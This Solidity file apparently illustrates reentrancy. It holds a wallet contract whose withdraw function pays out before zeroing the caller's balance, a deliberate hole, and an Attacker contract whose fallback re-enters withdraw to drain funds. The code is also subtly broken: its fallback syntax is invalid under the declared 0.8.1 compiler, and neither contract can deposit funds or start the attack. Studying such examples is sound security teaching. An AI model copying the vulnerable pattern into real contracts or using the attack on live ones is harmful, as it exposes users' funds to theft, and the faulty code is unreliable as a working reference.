pragma solidity 0.8.1;

contract ReentrantWallet {

    mapping(address => uint256) balances;


    function withdraw() external {
        uint256 amount = balances[msg.sender];

        (bool succeed, ) = msg.sender.call{value: amount}("");
        require(succeed);

        balances[msg.sender] = 0;
    }

}



contract Attacker {

    ReentrantWallet target;

    constructor(address _target) {
        target = ReentrantWallet(_target);
    }

    function () payable external {
        target.withdraw();
    }

}